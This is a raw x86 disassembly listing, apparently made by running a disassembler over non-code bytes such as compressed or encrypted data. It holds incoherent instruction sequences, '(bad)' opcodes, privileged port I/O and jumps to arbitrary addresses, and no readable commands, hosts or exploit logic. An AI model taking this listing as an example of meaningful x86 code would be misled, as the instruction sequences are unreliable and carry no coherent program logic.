  4232a8:	ror    DWORD PTR [ecx],1
  4232aa:	pop    ebx
  4232ab:	mov    edi,0xbae7144d
  4232b0:	inc    edx
  4232b1:	clc    
  4232b2:	jp     0x423314
  4232b4:	xchg   esi,eax
  4232b5:	mov    bh,0xbd
  4232b7:	mov    cl,0x39
  4232b9:	inc    edi
  4232ba:	hlt    
  4232bb:	mov    bh,0x55
  4232bd:	addr16 push es
  4232bf:	jecxz  0x423263
  4232c1:	mov    edx,0xe635d209
  4232c6:	jmp    0x6bda:0x6f3c28ef
  4232cd:	loopne 0x423305
  4232cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232d0:	loope  0x4232af
  4232d2:	sub    esi,DWORD PTR [edi-0x5b]
  4232d5:	jnp    0x423311
  4232d7:	je     0x4232a0
  4232d9:	retf   0x3d2e
  4232dc:	add    dh,ch
  4232de:	push   0xffffffef
  4232e0:	dec    ebx
  4232e1:	sbb    ecx,DWORD PTR [ebp+0x568fb92f]
  4232e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232e8:	and    eax,0xa54dca42
  4232ed:	(bad)  
  4232ee:	mov    ds:0x566a2f27,al
  4232f3:	ins    DWORD PTR es:[edi],dx
  4232f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232f5:	xchg   esp,eax
  4232f6:	sub    bh,bh
  4232f8:	in     eax,dx
  4232f9:	ins    BYTE PTR es:[edi],dx
  4232fa:	add    eax,0xc63e5a5a
  4232ff:	xchg   ebp,eax
  423300:	jne    0x4232b1
  423302:	xchg   ebp,eax
  423303:	jl     0x4232c9
  423305:	icebp  
  423306:	repz cmp DWORD PTR [ebx+0x27],ebx
  42330a:	rcl    BYTE PTR [edx+eax*4],0x8d
  42330e:	dec    edi
  42330f:	jl     0x42329f
  423311:	add    bl,BYTE PTR [esi+0x2a]
  423314:	pop    esp
  423315:	sub    dl,BYTE PTR gs:[ecx-0x64]
  423319:	fwait
  42331a:	or     BYTE PTR [edx],bl
  42331c:	xor    BYTE PTR ds:0xfebb8fa0,al
  423322:	int    0xb8
  423324:	and    BYTE PTR [edi+edi*8-0x441adc3e],0xae
  42332c:	pusha  
  42332d:	xor    BYTE PTR [ebp+0x2f],dl
  423330:	adc    ecx,eax
  423332:	vpsubusw ymm6,ymm7,YMMWORD PTR [esi-0x1a]
  423337:	pop    ebx
  423338:	ds js  0x42338a
  42333b:	test   al,0x3e
  42333d:	add    esp,DWORD PTR [ebx+0x67e585]
	...
  4233b3:	add    BYTE PTR [edx-0x7e],dl
  4233b6:	cs imul edi,esi,0x4bb57ed
  4233bd:	mov    eax,ds:0xd5af8e4a
  4233c2:	ss (bad) 
  4233c4:	xchg   edx,eax
  4233c5:	js     0x4233c8
  4233c7:	add    dh,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    bl,cl
  4233cd:	test   eax,0x5509f16d
  4233d2:	in     eax,0x1
  4233d4:	push   ecx
  4233d5:	inc    edx
  4233d6:	mov    ah,0x90
  4233d8:	cdq    
  4233d9:	push   esi
  4233da:	test   DWORD PTR [ecx+ecx*4+0x6dc899c1],esi
  4233e1:	scas   eax,DWORD PTR es:[edi]
  4233e2:	mov    dl,0x5d
  4233e4:	fwait
  4233e5:	push   esi
  4233e6:	xor    eax,0xa288c70e
  4233eb:	jp     0x423373
  4233ed:	push   edi
  4233ee:	sahf   
  4233ef:	rol    DWORD PTR [ebp+0x71],1
  4233f2:	idiv   bh
  4233f4:	data16 cmp ch,dh
  4233f7:	xchg   esi,eax
  4233f8:	inc    esp
  4233f9:	in     eax,0x21
  4233fb:	outs   dx,DWORD PTR ds:[esi]
  4233fc:	sub    DWORD PTR [edx*2-0x1b6e52f5],ebp
  423403:	cmp    eax,0x146f1e97
  423408:	sub    al,0x2e
  42340a:	test   al,0xf8
  42340c:	mov    ah,0x22
  42340e:	or     eax,0xb15f7c88
  423413:	cmp    al,0x6a
  423415:	jo     0x423413
  423417:	xchg   DWORD PTR [edx+0x54],eax
  42341a:	jl     0x42340c
  42341c:	xchg   BYTE PTR [eax+ebx*2-0x7ab3da77],ch
  423423:	xor    eax,0x45a3b1c4
  423428:	push   esi
  423429:	sub    dh,BYTE PTR [edx+0x6c]
  42342c:	xchg   esi,eax
  42342d:	and    eax,0xaded2363
  423432:	out    0x44,eax
  423434:	pop    esp
  423435:	adc    al,0xa2
  423437:	mov    ebx,DWORD PTR [ebp-0xf]
  42343a:	xchg   esp,eax
  42343b:	and    al,0xf4
  42343d:	cmp    BYTE PTR [ecx+0x60],ch
  423440:	dec    ebx
  423441:	xchg   ecx,eax
  423442:	xor    BYTE PTR [ecx-0x7],ch
  423445:	test   eax,0x6ca1b10e
  42344a:	sar    eax,1
  42344c:	xchg   ebp,eax
  42344d:	cwde   
  42344e:	into   
  42344f:	js     0x423461
  423451:	mov    bl,BYTE PTR [ecx-0x4e233b5]
  423457:	mov    WORD PTR [ebx+0x23720493],es
  42345d:	push   eax
  42345e:	or     ch,BYTE PTR [eax]
  423460:	jecxz  0x423488
  423462:	into   
  423463:	fadd   st,st(1)
  423465:	(bad)  
  423466:	cli    
  423467:	retf   0x3681
  42346a:	push   edx
  42346b:	outs   dx,BYTE PTR ds:[esi]
  42346c:	call   FWORD PTR [esi+0x1d52fea8]
  423472:	popf   
  423473:	ror    DWORD PTR [ecx+edi*8],cl
  423476:	mov    dh,0x51
  423478:	push   0x35
  42347a:	sar    DWORD PTR [ecx+0x25],1
  42347d:	clc    
  42347e:	dec    edx
  42347f:	pop    ebp
  423480:	mov    dh,0xd9
  423482:	int    0xa
  423484:	or     edi,DWORD PTR [eax-0x6c4e309c]
  42348a:	xchg   edi,eax
  42348b:	xor    eax,0xe8bf5d66
  423490:	mov    dh,0xbd
  423492:	and    BYTE PTR ds:0x35e4a285,0xa8
  423499:	jbe    0x423428
  42349b:	rcr    BYTE PTR [ecx-0x6e53d98b],0xa8
  4234a2:	adc    BYTE PTR [esi-0x60ee3c4c],bh
  4234a8:	xor    al,0x4c
  4234aa:	nop
  4234ab:	test   eax,0xe0e11fe
  4234b0:	out    dx,eax
  4234b1:	push   0xffffff96
  4234b3:	mov    WORD PTR [edx-0x50],ds
  4234b6:	lods   al,BYTE PTR ds:[esi]
  4234b7:	adc    eax,ecx
  4234b9:	call   0x1e1622d8
  4234be:	jae    0x42345b
  4234c0:	gs aaa 
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x47
  423541:	sub    dl,bh
  423543:	stc    
  423544:	mov    BYTE PTR [ecx+0x1],bh
  423547:	add    dh,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [edi+0x5a],ch
  42354e:	xchg   ebp,eax
  42354f:	jnp    0x4234dc
  423551:	adc    DWORD PTR [edi-0xc],eax
  423554:	(bad)  
  423555:	call   0x83dc:0xbf4b9fcf
  42355c:	push   edi
  42355d:	push   0x46404262
  423562:	lods   al,BYTE PTR ds:[esi]
  423563:	fdivr  st(2),st
  423565:	ins    DWORD PTR es:[edi],dx
  423566:	repz mov WORD PTR [edi],es
  423569:	das    
  42356a:	mov    BYTE PTR [esi+0x5ae5f1a7],ah
  423570:	mov    bh,0x1a
  423572:	inc    ebx
  423573:	int3   
  423574:	popf   
  423575:	jae    0x423552
  423577:	jecxz  0x42355c
  423579:	ret    
  42357a:	shl    DWORD PTR [esi-0xdf50634],0x31
  423581:	or     eax,0xc7942507
  423586:	test   al,0x84
  423588:	dec    esp
  423589:	mov    dh,0x51
  42358b:	inc    esp
  42358c:	push   cs
  42358d:	into   
  42358e:	pop    ss
  42358f:	stos   DWORD PTR es:[edi],eax
  423590:	mov    eax,0xd7669344
  423595:	loop   0x423532
  423597:	adc    cx,si
  42359a:	(bad)  
  42359b:	mov    ah,0xb0
  42359d:	js     0x423610
  42359f:	nop
  4235a0:	pop    eax
  4235a1:	add    DWORD PTR [ecx+0x6ceb4a87],ecx
  4235a7:	mov    ah,0x88
  4235a9:	in     al,dx
  4235aa:	ja     0x423587
  4235ac:	push   ebx
  4235ad:	xchg   ebx,eax
  4235ae:	int    0x13
  4235b0:	dec    eax
  4235b1:	dec    esi
  4235b2:	xchg   edx,eax
  4235b3:	js     0x4235ed
  4235b5:	add    dh,BYTE PTR [eax]
  4235b7:	dec    esi
  4235b8:	mov    ds:0xa37da4b5,eax
  4235bd:	neg    DWORD PTR [edx]
  4235bf:	popa   
  4235c0:	mov    ds:0x6ff4ca35,eax
  4235c5:	test   al,0x6a
  4235c7:	jp     0x423588
  4235c9:	enter  0xfd48,0x21
  4235cd:	or     BYTE PTR [esi+0x4],dh
  4235d0:	add    edi,ecx
  4235d2:	push   ebp
  4235d3:	(bad)
  4235d7:	fild   WORD PTR [edx+0x5]
  4235da:	sbb    bl,dh
  4235dc:	retf   0xb48e
  4235df:	mov    ?,ecx
  4235e1:	pop    edi
  4235e2:	inc    eax
  4235e3:	mov    edi,DWORD PTR ds:0xff4aae5
  4235e9:	and    al,0xce
  4235eb:	ror    BYTE PTR [ebp+eiz*8+0x67cd7bde],1
  4235f2:	hlt    
  4235f3:	arpl   dx,di
  4235f5:	hlt    
  4235f6:	mov    ecx,0x7832cbc
  4235fb:	mov    bh,0xfe
  4235fd:	mov    ah,0xa0
  4235ff:	or     BYTE PTR ds:0x26e5a007,al
  423605:	(bad)  
  423606:	push   ebp
  423607:	cmp    BYTE PTR [eax],0x80
  42360a:	ins    BYTE PTR es:[edi],dx
  42360b:	addr16 push cs
  42360d:	scas   eax,DWORD PTR es:[edi]
  42360e:	mov    esp,0x97632d89
  423613:	lods   eax,DWORD PTR ds:[esi]
  423614:	in     al,dx
  423615:	pop    eax
  423616:	mov    al,ds:0x1c638a6b
  42361b:	mov    WORD PTR [ebx+ebp*1-0x1f023d93],?
  423622:	dec    edx
  423623:	dec    edi
  423624:	jns    0x42369a
  423626:	clc    
  423627:	mov    bl,0x58
  423629:	cmp    DWORD PTR ds:0xa8ad4643,ebx
  42362f:	lea    edx,[edi-0x5d966437]
  423635:	pop    edi
  423636:	ret    
  423637:	jne    0x4236a9
  423639:	rcl    ch,cl
  42363b:	daa    
  42363c:	enter  0x12ac,0x70
  423640:	popf   
  423641:	inc    esi
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm4,mm5
  4236c1:	out    dx,al
  4236c2:	das    
  4236c3:	(bad)  
  4236c4:	jle    0x423740
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	test   BYTE PTR [eax],0x0
  4236cb:	add    BYTE PTR [ecx],dh
  4236cd:	add    ebp,DWORD PTR [esi]
  4236cf:	and    BYTE PTR [eax+0x3d],cl
  4236d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236d3:	retf   0xa414
  4236d6:	jge    0x4236cc
  4236d8:	in     eax,0xd
  4236da:	xchg   BYTE PTR [ebp+0x4e2f7d79],dh
  4236e0:	shr    BYTE PTR [eax],0x16
  4236e3:	call   0x26884368
  4236e8:	cmp    ecx,esi
  4236ea:	sbb    DWORD PTR [ebp+0x63df76d2],ebx
  4236f0:	cdq    
  4236f1:	or     eax,0x75a883d8
  4236f6:	sub    eax,0x6a0a0837
  4236fb:	stc    
  4236fc:	out    0xc2,eax
  4236fe:	stc    
  4236ff:	or     al,0xa9
  423701:	lds    ebx,FWORD PTR [ebx-0x60]
  423704:	std    
  423705:	in     al,0x30
  423707:	in     al,0x14
  423709:	jecxz  0x423788
  42370b:	ret    0x6baf
  42370e:	aad    0x2e
  423710:	(bad)  
  423711:	cli    
  423712:	outs   dx,DWORD PTR ds:[esi]
  423713:	out    0x4b,eax
  423715:	ret    0x98b6
  423718:	push   cs
  423719:	add    ch,BYTE PTR [edi-0x1a]
  42371c:	outs   dx,DWORD PTR ds:[esi]
  42371d:	das    
  42371e:	jmp    0x1601656e
  423723:	add    BYTE PTR ds:0x8152bb36,dl
  423729:	push   ss
  42372a:	clc    
  42372b:	mov    ebx,0x271b0805
  423730:	jne    0x42375a
  423732:	mov    bh,BYTE PTR [eax]
  423734:	int    0x5c
  423736:	les    edx,FWORD PTR [esi]
  423738:	ds pop esi
  42373a:	loope  0x4236f1
  42373c:	clc    
  42373d:	hlt    
  42373e:	push   0x7f
  423740:	lea    esi,[ecx+0x6e2d7aab]
  423746:	not    DWORD PTR [ebp+0x48]
  423749:	cmp    al,0x72
  42374b:	jmp    0x4236d6
  42374d:	jnp    0x42375b
  42374f:	sub    dl,BYTE PTR ds:0xeecd0b2e
  423755:	arpl   sp,di
  423757:	popf   
  423758:	cmc    
  423759:	aaa    
  42375a:	outs   dx,DWORD PTR ds:[esi]
  42375b:	mov    ds:0xac46776b,al
  423760:	xor    DWORD PTR [edx+0x65],0xffffffb6
  423764:	(bad)  
  423765:	mov    ds:0x38c978c7,eax
  42376a:	arpl   WORD PTR [esi-0x4bf457ac],si
  423770:	cld    
  423771:	sub    dh,BYTE PTR [ebp-0x2]
  423774:	jmp    0x6fb9:0x15e97d8
  42377b:	aaa    
  42377c:	loope  0x423733
  42377e:	in     eax,dx
  42377f:	lea    ebx,[esi+0x6af987f1]
  423785:	push   ebx
  423786:	pop    ebp
  423787:	mov    ecx,0x1e23248f
  42378c:	vxorps xmm1,xmm7,XMMWORD PTR [bx+si-0x6799]
  423793:	jl     0x4237ea
  423795:	loop   0x4237ba
  423797:	jnp    0x42373f
  423799:	test   al,0x3b
  42379b:	cmp    BYTE PTR [ebx],dh
  42379d:	dec    edi
  42379e:	push   0x50fe6dd8
  4237a3:	jecxz  0x42379d
  4237a5:	push   ss
  4237a6:	xchg   ebx,eax
  4237a7:	jb     0x423736
  4237a9:	ret    
  4237aa:	add    DWORD PTR [esi],0x5b
  4237ad:	rcl    DWORD PTR [ecx-0x58aabc55],0x7a
  4237b4:	sub    DWORD PTR [ecx],0x54
  4237b7:	repz or BYTE PTR [edi-0x24fdef],ch
  4237be:	adc    ecx,DWORD PTR [edi-0x1e]
  4237c1:	or     DWORD PTR [eax],eax
	...
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	jle    0x4237fb
  423842:	xor    BYTE PTR [ebp+0x17b74],dh
  423848:	test   BYTE PTR [eax],0x0
  42384b:	add    ch,bl
  42384d:	stos   BYTE PTR es:[edi],al
  42384e:	pop    ebp
  42384f:	sub    esp,0x1
  423852:	sbb    BYTE PTR [eax-0x1],bh
  423855:	pop    eax
  423856:	lea    ebp,[esp+edi*8+0x6c]
  42385a:	sub    eax,0xe658c2f1
  42385f:	mov    DWORD PTR [ebx+0x211f6ded],ecx
  423865:	xchg   BYTE PTR [edx+0x3c],ah
  423868:	sti    
  423869:	xchg   ecx,eax
  42386a:	dec    esi
  42386b:	mov    dh,0x9d
  42386d:	fstp   DWORD PTR [esi]
  42386f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423870:	int    0x99
  423872:	enter  0x5db4,0x52
  423876:	cdq    
  423877:	sub    BYTE PTR [eax-0x52],bh
  42387a:	dec    eax
  42387b:	push   es
  42387c:	pop    esi
  42387d:	add    edi,ebp
  42387f:	int    0x10
  423881:	or     eax,0xa2dc50a1
  423886:	mov    edi,0x6ab47165
  42388b:	jp     0x4238f4
  42388d:	pop    eax
  42388e:	bound  eax,QWORD PTR [ebx+0x2c01a0e]
  423894:	sti    
  423895:	sbb    eax,0x6f6e21f3
  42389a:	pop    edx
  42389b:	push   esi
  42389c:	dec    ebp
  42389d:	adc    ah,BYTE PTR [ebx-0x39afc087]
  4238a3:	inc    ecx
  4238a4:	push   esi
  4238a5:	cli    
  4238a6:	xchg   ebp,eax
  4238a7:	nop
  4238a8:	add    al,0x12
  4238aa:	fwait
  4238ab:	push   cs
  4238ac:	ror    BYTE PTR [ebx-0x53cedd8a],cl
  4238b2:	(bad)  
  4238b3:	and    BYTE PTR [edi],cl
  4238b5:	inc    edi
  4238b6:	sub    DWORD PTR [ecx],edx
  4238b8:	adc    eax,0x263e54a4
  4238bd:	mov    esp,0xb3ab35
  4238c2:	sahf   
  4238c3:	outs   dx,DWORD PTR ds:[esi]
  4238c4:	mov    bh,0x50
  4238c6:	jbe    0x4238f7
  4238c8:	hlt    
  4238c9:	adc    eax,0x3acc123c
  4238ce:	fiadd  WORD PTR [esi-0x6d]
  4238d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238d3:	inc    ebx
  4238d4:	outs   dx,DWORD PTR ds:[esi]
  4238d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238d6:	xor    ecx,DWORD PTR [ebx+0x2ac0e739]
  4238dc:	adc    DWORD PTR [ebx+0x55],edi
  4238df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238e0:	fdivp  st(3),st
  4238e2:	mov    ebp,0x9dcce63a
  4238e7:	jmp    0x4238e2
  4238e9:	jge    0x4238ba
  4238eb:	out    0x84,eax
  4238ed:	or     al,0xbe
  4238ef:	adc    eax,0x838b1908
  4238f4:	push   ss
  4238f5:	aad    0x17
  4238f7:	inc    ebp
  4238f8:	in     eax,0x62
  4238fa:	aam    0x64
  4238fc:	loopne 0x42397b
  4238fe:	and    eax,0x4b71d36
  423903:	std    
  423904:	dec    esi
  423905:	(bad)  
  423907:	scas   eax,DWORD PTR es:[edi]
  423908:	jle    0x4238a7
  42390a:	loope  0x423967
  42390c:	xor    esp,DWORD PTR [ebx+0x204ac886]
  423912:	mov    dl,0x5b
  423914:	rcl    esi,cl
  423916:	mov    ss,esp
  423918:	inc    edx
  423919:	mov    al,ds:0x37f5402e
  42391e:	jbe    0x423933
  423920:	cwde   
  423921:	mov    eax,?
  423923:	(bad)  
  423924:	(bad)  
  423925:	mov    eax,0xcdb35dd1
  42392a:	sbb    al,0xce
  42392c:	pop    ss
  42392d:	ds sti 
  42392f:	int3   
  423930:	dec    ebx
  423931:	xor    ah,ah
  423933:	jnp    0x4238bf
  423935:	(bad)  
  423938:	jl     0x4238c4
  42393a:	pop    ebx
  42393b:	or     ah,ah
  42393d:	mov    al,ds:0xd1e621b3
	...
  4239b2:	add    BYTE PTR [eax],al
  4239b4:	xchg   esi,eax
  4239b5:	push   0x18
  4239b7:	mov    ah,bh
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [edi-0x8],?
  4239c2:	addr16 out 0x6a,al
  4239c5:	jl     0x4239c8
  4239c7:	add    dh,dh
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    BYTE PTR [eax-0x15],bh
  4239ce:	ds sahf 
  4239d0:	dec    esp
  4239d1:	addr16 jnp 0x423a3d
  4239d4:	int3   
  4239d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239d6:	aas    
  4239d7:	jne    0x4239c3
  4239d9:	or     al,0x12
  4239db:	sbb    al,0xd1
  4239dd:	fwait
  4239de:	mul    BYTE PTR [ebx-0x522a7311]
  4239e4:	enter  0xfc18,0x80
  4239e8:	dec    ebp
  4239e9:	adc    eax,0x490ed322
  4239ee:	push   eax
  4239ef:	cwde   
  4239f0:	dec    eax
  4239f1:	pop    ebp
  4239f2:	shl    DWORD PTR [ecx-0x2e],0xe8
  4239f6:	cdq    
  4239f7:	push   ecx
  4239f8:	or     ecx,DWORD PTR [ebp+0x708b6c1f]
  4239fe:	xchg   ebx,eax
  4239ff:	hlt    
  423a00:	xor    DWORD PTR [ebp+0x51c1f768],edi
  423a06:	nop
  423a07:	scas   eax,DWORD PTR es:[edi]
  423a08:	adc    al,0x5c
  423a0a:	jle    0x423a30
  423a0c:	inc    edi
  423a0d:	and    DWORD PTR [edx+0x2cf1396a],esi
  423a13:	jae    0x4239ae
  423a15:	inc    ebx
  423a16:	(bad)  
  423a17:	lds    ebp,FWORD PTR [edi+esi*8]
  423a1a:	add    al,0x28
  423a1c:	dec    eax
  423a1d:	dec    edx
  423a1e:	sub    edx,esi
  423a20:	and    BYTE PTR [eax+0x30270e6b],bl
  423a26:	in     al,0x70
  423a28:	sar    BYTE PTR [edx+0x6f31bc13],0x95
  423a2f:	adc    ebp,DWORD PTR [ebp+0x72]
  423a32:	jbe    0x4239f7
  423a34:	cld    
  423a35:	aam    0xd0
  423a37:	cs aaa 
  423a39:	push   ecx
  423a3a:	add    esi,DWORD PTR [esi]
  423a3c:	fs mov ds,ebp
  423a3f:	mov    bl,0x7d
  423a41:	int3   
  423a42:	xor    dl,al
  423a44:	fadd   DWORD PTR [edi-0x40]
  423a47:	jecxz  0x423a4a
  423a49:	pop    edi
  423a4a:	xchg   BYTE PTR [ebp+0x71],ch
  423a4d:	imul   ebp,DWORD PTR [eax+0x3ea15888],0x934c9c39
  423a57:	ret    0x5de0
  423a5a:	pop    esi
  423a5b:	rcl    BYTE PTR [ebp-0x43],cl
  423a5e:	(bad)  
  423a5f:	pop    edx
  423a60:	pop    esp
  423a61:	jle    0x423ab6
  423a63:	jp     0x98877552
  423a69:	mov    bl,0x56
  423a6b:	retf   
  423a6c:	mov    bl,0x9d
  423a6e:	stos   DWORD PTR es:[edi],eax
  423a6f:	unpcklps xmm1,XMMWORD PTR [esi-0x25]
  423a73:	mov    di,0x6aca
  423a77:	les    edi,FWORD PTR [ebx+0x7e]
  423a7a:	pop    esp
  423a7b:	cmc    
  423a7c:	mov    edx,0xcfadbd8d
  423a81:	xor    al,0x7e
  423a83:	xlat   BYTE PTR ds:[ebx]
  423a84:	sub    edx,ebx
  423a86:	jmp    0x423a29
  423a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a89:	pusha  
  423a8a:	push   edi
  423a8b:	ins    DWORD PTR es:[di],dx
  423a8d:	stc    
  423a8e:	pop    esi
  423a8f:	xchg   DWORD PTR [edx+0x3d],edx
  423a92:	out    dx,al
  423a93:	sub    BYTE PTR [ecx+0x11],0x75
  423a97:	cmc    
  423a98:	inc    esi
  423a99:	add    al,0xeb
  423a9b:	fucom  st(7)
  423a9d:	lock push esp
  423a9f:	mov    ebx,0xf2dacc18
  423aa4:	popa   
  423aa5:	xchg   edi,eax
  423aa6:	dec    edx
  423aa7:	mov    ebp,DWORD PTR [edx]
  423aa9:	and    dh,BYTE PTR [ebx]
  423aab:	into   
  423aac:	cwde   
  423aad:	xchg   edx,eax
  423aae:	out    dx,al
  423aaf:	xchg   edi,eax
  423ab0:	in     eax,0xef
  423ab2:	lods   eax,DWORD PTR ds:[esi]
  423ab3:	es ins DWORD PTR es:[edi],dx
  423ab5:	mov    ebx,0x727611b1
  423aba:	adc    eax,eax
  423abc:	mov    bl,0xb
  423abe:	cmc    
  423abf:	jne    0x423aed
  423ac1:	xchg   ebp,eax
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x74
  423b41:	mov    eax,0x7d6023b6
  423b46:	add    DWORD PTR [eax],eax
  423b48:	test   BYTE PTR [eax],0x0
  423b4b:	add    BYTE PTR [edx],al
  423b4d:	(bad)  
  423b4e:	iret   
  423b4f:	cmc    
  423b50:	sti    
  423b51:	sbb    eax,0xffa8a652
  423b56:	inc    eax
  423b57:	push   ebp
  423b58:	dec    ebp
  423b59:	xchg   ecx,eax
  423b5a:	pop    ss
  423b5b:	into   
  423b5c:	std    
  423b5d:	(bad)  
  423b5e:	(bad)  
  423b5f:	outs   dx,BYTE PTR ds:[esi]
  423b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b61:	push   ebx
  423b62:	xchg   ebp,eax
  423b63:	or     DWORD PTR [edx+ecx*8-0x54],ecx
  423b67:	pop    ecx
  423b68:	fst    st(3)
  423b6a:	and    al,al
  423b6c:	pop    esp
  423b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b6e:	test   al,0x5a
  423b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b71:	xor    cl,BYTE PTR [eax]
  423b73:	ins    DWORD PTR es:[edi],dx
  423b74:	push   ebp
  423b75:	sbb    DWORD PTR [eax],ecx
  423b77:	dec    edi
  423b78:	mov    ah,BYTE PTR [edx-0xef46a91]
  423b7e:	popa   
  423b7f:	pushf  
  423b80:	sub    bh,ah
  423b82:	data16 into 
  423b84:	push   0x60
  423b86:	dec    ebp
  423b87:	cli    
  423b88:	out    0x42,al
  423b8a:	stos   BYTE PTR es:[edi],al
  423b8b:	inc    edi
  423b8c:	or     DWORD PTR [edi+edx*2-0x1c],edi
  423b90:	hlt    
  423b91:	lock aas 
  423b93:	push   esi
  423b94:	ins    BYTE PTR es:[edi],dx
  423b95:	sti    
  423b96:	retf   0x27b8
  423b99:	pop    ebp
  423b9a:	bswap  edi
  423b9c:	add    DWORD PTR [edx-0x6b5c9bce],ebp
  423ba2:	clc    
  423ba3:	pop    edx
  423ba4:	jmp    0x423b68
  423ba6:	mov    edx,0xc828c608
  423bab:	pop    edi
  423bac:	cmp    BYTE PTR [ecx-0x7356b0],ah
  423bb2:	jl     0x423b61
  423bb4:	jg     0x423b3e
  423bb6:	lock int3 
  423bb8:	mov    esi,0xce2c18f9
  423bbd:	sub    eax,0x3fe5d387
  423bc3:	repz leave 
  423bc5:	push   cs
  423bc6:	sbb    ah,al
  423bc8:	shl    BYTE PTR [ebx-0x255c25b],1
  423bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bcf:	sbb    edi,DWORD PTR [esi+0x89a33d1]
  423bd5:	and    BYTE PTR [edx+0x69],dl
  423bd8:	sbb    dl,bh
  423bda:	iret   
  423bdb:	jno    0x423c47
  423bdd:	add    ebp,DWORD PTR [edx-0x7ec6b1b4]
  423be3:	jg     0x423b99
  423be5:	(bad)  
  423be6:	jne    0x423b9a
  423be8:	pop    esi
  423be9:	push   es
  423bea:	aam    0xc3
  423bec:	lock call 0x1f99:0x23b1d14e
  423bf4:	push   ss
  423bf5:	test   al,dl
  423bf7:	fwait
  423bf8:	jmp    0x64e5211a
  423bfd:	and    ecx,DWORD PTR [edx-0x4fcfeda9]
  423c03:	in     al,0x12
  423c05:	and    esi,edx
  423c07:	mov    bl,0x90
  423c09:	aas    
  423c0a:	and    ah,BYTE PTR [esi-0x89c1500]
  423c10:	fdiv   QWORD PTR [ebx-0xd]
  423c13:	mov    al,ds:0xaa8e226a
  423c18:	jno    0x423c16
  423c1a:	int    0xd2
  423c1c:	fs ins DWORD PTR es:[edi],dx
  423c1e:	pop    ebp
  423c1f:	addr16 cmp al,0xf1
  423c22:	mov    al,ds:0x4e2a72e8
  423c27:	(bad)  
  423c28:	jecxz  0x423c7e
  423c2a:	and    edi,DWORD PTR [ecx]
  423c2c:	inc    esi
  423c2d:	xor    ah,cl
  423c2f:	sbb    eax,0x46667cac
  423c34:	bound  edx,QWORD PTR [edx-0x174e51c9]
  423c3a:	mov    ebx,0xdedbf9ec
  423c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c40:	ficom  WORD PTR [ecx+0x0]
	...
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x3933,0xca
  423cc3:	or     al,0x56
  423cc5:	jle    0x423cc8
  423cc7:	add    dh,dh
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR [edi],bl
  423ccd:	jp     0x423d0d
  423ccf:	ret    
  423cd0:	add    edx,DWORD PTR [ebp+0x771ecde8]
  423cd6:	test   BYTE PTR [ecx],0x7e
  423cd9:	cmp    dl,dh
  423cdb:	in     al,dx
  423cdc:	(bad)  
  423cdd:	int3   
  423cde:	in     eax,dx
  423cdf:	scas   eax,DWORD PTR es:[edi]
  423ce0:	sub    eax,DWORD PTR [edx-0x71]
  423ce3:	inc    edx
  423ce4:	inc    eax
  423ce5:	mov    ebx,0x1bc50e44
  423cea:	mov    ah,dh
  423cec:	das    
  423ced:	int3   
  423cee:	neg    esi
  423cf0:	xchg   esp,eax
  423cf1:	dec    ecx
  423cf2:	out    dx,al
  423cf3:	dec    esp
  423cf4:	cmp    esp,DWORD PTR [ecx+0x52c1cab8]
  423cfa:	shr    edi,cl
  423cfc:	add    eax,0x56b6fd77
  423d01:	dec    esi
  423d02:	dec    ecx
  423d03:	push   0x27f441ca
  423d08:	shr    BYTE PTR [esp+edx*8-0x45],0x46
  423d0d:	adc    esp,ecx
  423d0f:	ret    
  423d10:	not    esi
  423d12:	jns    0x423ce2
  423d14:	rol    DWORD PTR [ecx+0x428c413d],0x68
  423d1b:	out    dx,al
  423d1c:	lods   eax,DWORD PTR ds:[esi]
  423d1d:	leave  
  423d1e:	mov    eax,0xf766692d
  423d23:	mov    ch,0x29
  423d25:	pop    eax
  423d26:	push   0xfffffff1
  423d28:	xchg   esi,eax
  423d29:	ret    
  423d2a:	loop   0x423d0c
  423d2c:	xchg   DWORD PTR [ebp-0x2e],edx
  423d2f:	dec    eax
  423d30:	cmc    
  423d31:	or     al,dl
  423d33:	sub    eax,0x15214704
  423d38:	pop    esp
  423d39:	add    esp,ebp
  423d3b:	ds push esp
  423d3d:	inc    esi
  423d3e:	retf   0xdb15
